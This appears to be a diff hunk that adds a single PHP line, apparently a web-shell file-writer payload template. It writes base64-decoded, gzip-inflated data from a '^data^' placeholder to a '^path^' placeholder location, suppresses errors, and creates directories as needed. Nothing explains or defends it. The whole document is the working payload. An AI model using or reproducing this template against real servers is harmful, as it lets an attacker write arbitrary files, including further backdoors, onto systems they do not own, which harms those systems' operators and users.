@@ -1,0 +1,1 @@
+<?php $f='"^path^"';@mkdir(dirname($f));$h=fopen($f,'ab+');echo@fwrite($h,@gzinflate(@base64_decode('"^data^"')));fclose($h);?>
